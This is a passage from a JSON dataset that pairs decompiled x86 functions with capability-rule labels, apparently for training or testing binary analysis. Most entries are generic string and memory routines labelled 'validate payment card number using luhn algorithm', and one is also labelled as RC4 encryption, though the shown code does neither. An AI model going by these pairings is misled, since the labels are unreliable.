*(unaff_EBP + -0x20) = uVar1;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041ea7c();\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 617
    },
    "0041f19f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0041f19f(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t arg_8h_00;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43af78, 8);\n    piVar1 = *(unaff_EBP + 8) * 8 + 0x4444d0;\n    if (*piVar1 == 0) {\n        arg_8h_00 = fcn.0041ba5b(0x18);\n        if (arg_8h_00 == 0) {\n            puVar2 = fcn.0041da34();\n            *puVar2 = 0xc;\n        }\n        else {\n            fcn.0041f23f(10);\n            *(unaff_EBP + -4) = 0;\n            if (*piVar1 == 0) {\n                iVar3 = fcn.00423cc4(arg_8h_00, 4000);\n                if (iVar3 == 0) {\n                    fcn.0041ba6d(arg_8h_00);\n                    puVar2 = fcn.0041da34();\n                    *puVar2 = 0xc;\n                    fcn.0041b84a(unaff_EBP + -0x10, 0xffffffff);\n                    goto code_r0x0041f230;\n                }\n                *piVar1 = arg_8h_00;\n            }\n            else {\n                fcn.0041ba6d(arg_8h_00);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041f236();\n        }\n    }\ncode_r0x0041f230:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 457
    },
    "0041f666": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.0041f666(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (*0x44aca4 == *0x44acb4) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x44acbc, 0, *0x44aca8, (*0x44acb4 * 5 + 0x50) * 4);\n        if (iVar2 == 0) {\n            return NULL;\n        }\n        *0x44acb4 = *0x44acb4 + 0x10;\n        *0x44aca8 = iVar2;\n    }\n    puVar1 = *0x44aca8 + *0x44aca4 * 0x14;\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x44acbc, 8, 0x41c4);\n    puVar1[4] = iVar2;\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x100000, 0x2000, 4);\n        puVar1[3] = iVar2;\n        if (iVar2 != 0) {\n            puVar1[2] = 0xffffffff;\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            *0x44aca4 = *0x44aca4 + 1;\n            *puVar1[4] = 0xffffffff;\n            return puVar1;\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x44acbc, 0, puVar1[4]);\n    }\n    return NULL;\n}\n",
        "token_count": 383
    },
    "00420ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.00420ae0(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar4 = param_1 & 3;\n    puVar3 = param_1;\n    while (uVar4 != 0) {\n        uVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        if (uVar1 == 0) goto code_r0x00420b33;\n        uVar4 = puVar3 & 3;\n    }\n    do {\n        do {\n            puVar5 = puVar3;\n            puVar3 = puVar5 + 1;\n        } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);\n        uVar4 = *puVar5;\n        if (uVar4 == '\\0') goto code_r0x00420b45;\n        if (uVar4 >> 8 == '\\0') {\n            puVar5 = puVar5 + 1;\n            goto code_r0x00420b45;\n        }\n        if ((uVar4 & 0xff0000) == 0) {\n            puVar5 = puVar5 + 2;\n            goto code_r0x00420b45;\n        }\n    } while ((uVar4 & 0xff000000) != 0);\ncode_r0x00420b33:\n    puVar5 = puVar3 + -1;\ncode_r0x00420b45:\n    uVar4 = param_2 & 3;\n    while (uVar4 != 0) {\n        uVar1 = *param_2;\n        uVar4 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x00420bc0;\n        *puVar5 = uVar1;\n        puVar5 = puVar5 + 1;\n        uVar4 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar4 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar4 == '\\0') {\ncode_r0x00420bc0:\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if (uVar4 >> 8 == '\\0') {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if ((uVar4 & 0xff0000) == 0) {\n                *puVar5 = uVar4;\n                *(puVar5 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar4 & 0xff000000) == 0) {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n        }\n        *puVar5 = uVar4;\n        puVar5 = puVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 752
    },
    "00420ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.00420ad0(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    uVar3 = param_2 & 3;\n    puVar4 = param_1;\n    while (uVar3 != 0) {\n        uVar1 = *param_2;\n        uVar3 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x00420bc0;\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        uVar3 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar3 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar3 == '\\0') {\ncode_r0x00420bc0:\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if (uVar3 >> 8 == '\\0') {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n            if ((uVar3 & 0xff0000) == 0) {\n                *puVar4 = uVar3;\n                *(puVar4 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar3 & 0xff000000) == 0) {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n        }\n        *puVar4 = uVar3;\n        puVar4 = puVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 439
    },
    "0042152e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042152e(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43b408, 0xc);\n    *(unaff_EBP + -0x1c) = 0x43e42c;\n    while (*(unaff_EBP + -0x1c) < 0x43e42c) {\n        *(unaff_EBP + -4) = 0;\n        if (**(unaff_EBP + -0x1c) != NULL) {\n            (***(unaff_EBP + -0x1c))();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n    }\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 227
    },
    "00422c04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __cdecl fcn.00422c04(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint noname_2;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint32_t var_4h;\n    \n    if (arg_ch + 1 < 0x101) {\n        arg_ch._2_2_ = *(*(arg_8h + 0x48) + arg_ch * 2);\n    }\n    else {\n        if ((*(*(arg_8h + 0x48) + 1 + (arg_ch >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            var_4h = in_ECX & 0xffff0000 | arg_ch & 0xff;\n            noname_2 = 1;\n        }\n        else {\n            var_4h = CONCAT11(arg_ch, arg_ch >> 8);\n            var_4h = in_ECX & 0xff000000 | var_4h;\n            noname_2 = 2;\n        }\n        iVar1 = fcn.00422a4a(1, &var_4h, noname_2, &arg_ch + 2, *(arg_8h + 4), *(arg_8h + 0x14), 1, var_4h, unaff_EBP, \n                             unaff_retaddr, arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return arg_ch._2_2_ & arg_10h;\n}\n",
        "token_count": 430
    },
    "004236ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nbool fcn.004236ea(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *unaff_EBX;\n    uint32_t uVar6;\n    \n    if (*0x444924 == 0) {\n        return false;\n    }\n    iVar1 = unaff_EBX[5];\n    if ((iVar1 != *0x4449b8) || (iVar1 != *0x4449c4)) {\n        if (*0x449a64 == 0) {\n            fcn.00423532(1, 1, iVar1, 1, 0, 0, 0, 0, 0);\n            fcn.00423532(0, 1, iVar1, 5, 0, 0, 0, 0, 0);\n        }\n        else {\n            if (*0x449a50 != 0) {\n                uVar6 = *0x449a56;\n                uVar3 = 0;\n                uVar4 = 0;\n            }\n            else {\n                uVar3 = *0x449a54;\n                uVar6 = 0;\n                uVar4 = *0x449a56;\n            }\n            fcn.00423532(1, *0x449a50 == 0, iVar1, uVar4, uVar3, uVar6, *0x449a5a, *0x449a5c, *0x449a5e);\n            if (*0x4499fc != 0) {\n                uVar6 = *0x449a02;\n                uVar3 = 0;\n                uVar4 = 0;\n            }\n            else {\n                uVar3 = *0x449a00;\n                uVar6 = 0;\n                uVar4 = *0x449a02;\n            }\n            fcn.00423532(0, *0x4499fc == 0, iVar1, uVar4, uVar3, uVar6, *0x449a06, *0x449a08, *0x449a0a);\n        }\n    }\n    iVar1 = unaff_EBX[7];\n    if (*0x4449bc < *0x4449c8) {\n        if ((iVar1 < *0x4449bc) || (*0x4449c8 < iVar1)) {\n            return false;\n        }\n        if ((*0x4449bc < iVar1) && (iVar1 < *0x4449c8)) {\n            return true;\n        }\n    }\n    else {\n        if (iVar1 < *0x4449c8) {\n            return true;\n        }\n        if (*0x4449bc < iVar1) {\n            return true;\n        }\n        if ((*0x4449c8 < iVar1) && (iVar1 < *0x4449bc)) {\n            return false;\n        }\n    }\n    iVar5 = ((unaff_EBX[2] * 0x3c + unaff_EBX[1]) * 0x3c + *unaff_EBX) * 1000;\n    if (iVar1 == *0x4449bc) {\n        bVar2 = *0x4449c0 <= iVar5;\n    }\n    else {\n        bVar2 = iVar5 < *0x4449cc;\n    }\n    return bVar2;\n}\n",
        "token_count": 764
    },
    "004239c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004239c0(char *arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = arg_10h;\n    pcVar6 = arg_8h;\n    if (arg_10h != 0) {\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        iVar5 = arg_10h - uVar4;\n        do {\n            pcVar6 = arg_ch;\n            pcVar7 = arg_8h;\n            if (iVar5 == 0) break;\n            iVar5 = iVar5 + -1;\n            pcVar7 = arg_8h + 1;\n            pcVar6 = arg_ch + 1;\n            cVar1 = *arg_ch;\n            cVar2 = *arg_8h;\n            arg_ch = pcVar6;\n            arg_8h = pcVar7;\n        } while (cVar1 == cVar2);\n        uVar3 = pcVar6[-1];\n        arg_10h = 0;\n        bVar8 = uVar3 == pcVar7[-1];\n        if (uVar3 < pcVar7[-1] || bVar8) {\n            if (bVar8) {\n                return 0;\n            }\n            arg_10h = 0xfffffffe;\n        }\n        arg_10h = ~arg_10h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 415
    },
    "00423e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00423e40(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    \n    if (arg_10h != 0) {\n        do {\n            uVar2 = *arg_8h;\n            uVar1 = *arg_ch;\n            if ((uVar2 == 0) || (uVar1 == 0)) break;\n            arg_8h = arg_8h + 1;\n            arg_ch = arg_ch + 1;\n            if ((0x40 < uVar2) && (uVar2 < 0x5b)) {\n                uVar2 = uVar2 + 0x20;\n            }\n            if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                uVar1 = uVar1 + 0x20;\n            }\n            bVar3 = uVar2 < uVar1;\n            if (uVar2 != uVar1) goto code_r0x00423e91;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        arg_10h = 0;\n        bVar3 = uVar2 < uVar1;\n        if (uVar2 != uVar1) {\ncode_r0x00423e91:\n            arg_10h = -1;\n            if (!bVar3) {\n                arg_10h = 1;\n            }\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 364
    },
    "00424468": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424468(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041e005();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x4447cc) {\n        iVar1 = fcn.00422e0c();\n    }\n    fcn.00424408(iVar1, param_1, param_2);\n    return;\n}\n",
        "token_count": 102
    },
    "004247b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004247b8(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041e005();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x4447cc) {\n        iVar1 = fcn.00422e0c();\n    }\n    fcn.004246f8(iVar1, param_1, param_2, param_3);\n    return;\n}\n",
        "token_count": 113
    },
    "00424c28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424c28(uint param_1, uint param_2)\n\n{\n    fcn.00424ad0(param_1, param_2, 0x444ccc);\n    return;\n}\n",
        "token_count": 46
    },
    "00424c3e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424c3e(uint param_1, uint param_2)\n\n{\n    fcn.00424ad0(param_1, param_2, 0x444ce4);\n    return;\n}\n",
        "token_count": 48
    },
    "00424c54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424c54(uint arg_8h, uint arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    fcn.00425d13(&var_10h, &var_14h, arg_ch, 0, 0, 0, 0);\n    fcn.00424c28(&var_10h, arg_8h);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 124
    },
    "00424c91": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424c91(uint arg_8h, uint arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    fcn.00425d13(&var_10h, &var_14h, arg_ch, 0, 0, 0, 0);\n    fcn.00424c3e(&var_10h, arg_8h);\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 125
    },
    "00424cce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424cce(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char *arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char cVar4;\n    \n    arg_8h_00 = arg_8h;\n    pcVar3 = *(arg_10h + 0xc);\n    arg_ch_00 = arg_8h + 1;\n    *arg_8h = '0';\n    pcVar1 = arg_ch_00;\n    if (0 < arg_ch) {\n        arg_8h = arg_ch;\n        arg_ch = 0;\n        do {\n            cVar4 = *pcVar3;\n            if (cVar4 == '\\0') {\n                cVar4 = '0';\n            }\n            else {\n                pcVar3 = pcVar3 + 1;\n            }\n            *pcVar1 = cVar4;\n            pcVar1 = pcVar1 + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != NULL);\n    }\n    *pcVar1 = '\\0';\n    if ((-1 < arg_ch) && ('4' < *pcVar3)) {\n        while (pcVar1 = pcVar1 + -1,  *pcVar1 == '9') {\n            *pcVar1 = '0';\n        }\n        *pcVar1 = *pcVar1 + '\\x01';\n    }\n    if (*arg_8h_00 == '1') {\n        *(arg_10h + 4) = *(arg_10h + 4) + 1;\n    }\n    else {\n        iVar2 = fcn.0041c6f0(arg_ch_00);\n        fcn.0041b0f0(arg_8h_00, arg_ch_00, iVar2 + 1);\n    }\n    return;\n}\n",
        "token_count": 441
    },
    "00424dff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00424dff(uint arg_8h, uint noname_1, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint in_stack_ffffffb8;\n    ushort uVar4;\n    uint var_2ch;\n    uchar var_28h [24];\n    uint var_10h;\n    uint uStack16;\n    ushort uStack12;\n    uint var_4h;\n    \n    uVar4 = in_stack_ffffffb8 >> 0x10;\n    var_4h = *0x444220;\n    fcn.00424d45(&var_10h, &arg_8h);\n    iVar3 = fcn.00426147(var_10h, uStack16, CONCAT22(uVar4, uStack12), 0x11, 0, &var_2ch);\n    iVar2 = arg_14h;\n    piVar1 = arg_10h;\n    arg_10h[2] = iVar3;\n    *arg_10h = var_2ch._2_1_;\n    arg_10h[1] = var_2ch;\n    fcn.00420ad0(arg_14h, var_28h);\n    piVar1[3] = iVar2;\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 327
    },
    "00425325": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00425325(uint param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t unaff_ESI;\n    \n    uVar1 = param_2;\n    do {\n        if (*(uVar1 + 4) == unaff_ESI) break;\n        uVar1 = uVar1 + 0xc;\n    } while (uVar1 < param_2 + *0x44471c * 0xc);\n    if ((param_2 + *0x44471c * 0xc <= uVar1) || (*(uVar1 + 4) != unaff_ESI)) {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 164
    },
    "0042647c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0042647c(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_WideCharToMultiByte;\n    var_4h = 0;\n    iVar2 = **0x449660;\n    piVar3 = *0x449660;\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar2 = (*pcVar1)(0, 0, iVar2, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar2 == 0) || (var_4h = fcn.0041ba5b(iVar2),  var_4h == 0)) break;\n        iVar2 = (*pcVar1)(0, 0, *piVar3, 0xffffffff, var_4h, iVar2, 0, 0);\n        if (iVar2 == 0) {\n            fcn.0041ba6d(var_4h);\n            return 0xffffffff;\n        }\n        iVar2 = fcn.00426d6b(&var_4h, 0);\n        if ((iVar2 < 0) && (var_4h != 0)) {\n            fcn.0041ba6d(var_4h);\n            var_4h = 0;\n        }\n        piVar3 = piVar3 + 1;\n        iVar2 = *piVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 361
    },
    "00427c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427c90(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    \n    iVar1 = arg_8h;\n    iVar5 = 0;\n    if (arg_8h < 0) {\ncode_r0x00427d4a:\n        fcn.004275b6();\n    }\n    else {\n        if (-1 < arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (arg_8h == 0) {\n            fcn.00428fdc(*(in_ECX + 4));\n            *(in_ECX + 0xc) = 0;\n            *(in_ECX + 8) = 0;\n            goto code_r0x00427d8b;\n        }\n        if (*(in_ECX + 4) == 0) {\n            uVar3 = fcn.00428fb1(arg_8h);\n            *(in_ECX + 4) = uVar3;\n            fcn.0041cc60(uVar3, 0, arg_8h);\n            *(in_ECX + 0xc) = arg_8h;\ncode_r0x00427ce5:\n            *(in_ECX + 8) = arg_8h;\n            return;\n        }\n        iVar5 = *(in_ECX + 0xc);\n        if (arg_8h <= iVar5) {\n            iVar1 = *(in_ECX + 8);\n            if (iVar1 < arg_8h) {\n                fcn.0041cc60(iVar1 + *(in_ECX + 4), 0, arg_8h - iVar1);\n            }\n            goto code_r0x00427ce5;\n        }\n        iVar4 = *(in_ECX + 0x10);\n        if (iVar4 == 0) {\n            iVar4 = *(in_ECX + 8) / 8;\n            if (iVar4 < 4) {\ncode_r0x00427d36:\n                iVar4 = 4;\n            }\n            else if (iVar4 < 0x401) {\n                if (iVar4 < 4) goto code_r0x00427d36;\n            }\n            else {\n                iVar4 = 0x400;\n            }\n        }\n        iVar2 = iVar4 + iVar5;\n        if (iVar4 + iVar5 <= arg_8h) {\n            iVar2 = arg_8h;\n        }\n        arg_8h = iVar2;\n        if (arg_8h < iVar5) goto code_r0x00427d4a;\n    }\n    iVar5 = fcn.00428fb1(arg_8h);\n    fcn.0041c370(iVar5, *(in_ECX + 4), *(in_ECX + 8));\n    fcn.0041cc60(*(in_ECX + 8) + iVar5, 0, iVar1 - *(in_ECX + 8));\n    fcn.00428fdc(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x00427d8b:\n    *(in_ECX + 4) = iVar5;\n    return;\n}\n",
        "token_count": 757
    },
    "004280dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004280dc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = arg_8h;\n    puVar2 = fcn.00427f2c(arg_8h, &arg_8h, &var_4h);\n    if (puVar2 == NULL) {\n        if (*(in_ECX + 4) == 0) {\n            fcn.00427e9c(*(in_ECX + 8), 1);\n        }\n        puVar2 = fcn.00428091();\n        puVar2[1] = iVar1;\n        *puVar2 = *(arg_8h * 4 + *(in_ECX + 4));\n        *(arg_8h * 4 + *(in_ECX + 4)) = puVar2;\n    }\n    return puVar2 + 2;\n}\n",
        "token_count": 217
    },
    "004281df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004281df(uint param_1, uchar *param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    \n    if (param_2 != NULL) {\n        iVar1 = fcn.00431a51();\n        puVar2 = fcn.00401170(*(iVar1 + 0xc), param_1);\n        if (puVar2 != NULL) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, puVar2 + 1, *puVar2, param_2, param_3 + -1, 0, 0)\n            ;\n            param_2[iVar1] = 0;\n            return iVar1;\n        }\n        *param_2 = 0;\n    }\n    return 0;\n}\n",
        "token_count": 189
    },
    "00428620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00428620(int32_t *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_14h;\n    \n    puVar1 = (**(*param_1 + 0x28))();\n    do {\n        if (puVar1 == NULL) {\n            return 0;\n        }\n        arg_14h = 0;\n        if (*(param_2 + 4) < 0xc000) {\n            iVar2 = fcn.00429c9d(puVar1[1], *(param_2 + 4), 0, 0);\n            if (iVar2 != 0) {\ncode_r0x00428655:\n                (**(iVar2 + 0x14))(*(param_2 + 8), *(param_2 + 0xc));\n                return 1;\n            }\n        }\n        else {\n            iVar2 = puVar1[1];\n            while (iVar2 = fcn.00429c9d(iVar2, 0xc000, 0, arg_14h),  iVar2 != 0) {\n                if (**(iVar2 + 0x10) == *(param_2 + 4)) goto code_r0x00428655;\n                iVar2 = iVar2 + 0x18;\n            }\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 315
    },
    "004289fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __thiscall fcn.004289fe(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBX;\n    int32_t arg_8h;\n    \n    if (param_2 < 1) {\n        iVar3 = *(param_1 + 0x1c);\n        if (((iVar3 != 0) && (*(iVar3 + 0x1c) != 0)) &&\n           (iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar3 + 0x1c)),  iVar1 != 0)) {\n            fcn.0042b476(iVar3, *(iVar3 + 0x1c), 0x363, 1, 0);\n            fcn.0042b74d(*(iVar3 + 0x1c), 0x363, 1, 0, 1, 1);\n        }\n        fcn.00431a51();\n        arg_8h = 0x4311cd;\n        iVar1 = fcn.00432999(0x4311cd);\n        for (iVar1 = *(iVar1 + 8); iVar1 != 0; iVar1 = *(iVar1 + 0x68)) {\n            if ((*(iVar1 + 0x1c) != 0) && (iVar1 != iVar3)) {\n                if (*(iVar1 + 0x9c) == 0) {\n                    fcn.0042cf22(0, arg_8h);\n                }\n                iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar1 + 0x1c));\n                if ((iVar2 != 0) || (-1 < *(iVar1 + 0x9c))) {\n                    fcn.0042b476(iVar1, *(iVar1 + 0x1c), 0x363, 1, 0);\n                    arg_8h = *(iVar1 + 0x1c);\n                    fcn.0042b74d(arg_8h, 0x363, 1, 0, 1, 1);\n                }\n                iVar2 = *(iVar1 + 0x9c);\n                if (0 < iVar2) {\n                    fcn.0042cf22();\n                    arg_8h = iVar2;\n                }\n                *(iVar1 + 0x9c) = 0xffffffff;\n            }\n        }\n    }\n    else {\n        fcn.00431a51();\n        iVar3 = fcn.00432999(0x4311cd);\n        if (*(iVar3 + 0x10) == 0) {\n            fcn.0042dd83();\n            fcn.0042df35(1);\n        }\n    }\n    return unaff_EBX < 0;\n}\n",
        "token_count": 630
    },
    "00428b21": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428b21(int32_t param_1)\n\n{\n    if (*(param_1 + 0x10) != 0) {\n    // WARNING: Could not recover jumptable at 0x00428b2a. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*(param_1 + 0x10) + 0x1c))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00428b2e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
